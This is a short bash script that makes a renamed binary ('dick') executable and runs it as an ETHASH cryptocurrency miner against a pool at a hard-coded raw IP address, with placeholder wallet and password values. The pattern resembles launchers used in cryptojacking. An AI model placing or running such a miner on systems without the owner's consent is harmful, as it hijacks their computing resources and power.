#!/bin/bash
POOL=178.63.61.138:55439
WORKER=xxxWALLETxxx.00006CDA
chmod +x dick
./dick --algo ETHASH --pool $POOL --user $WORKER --ethstratum ETHPROXY --pass xxxPASSxxx
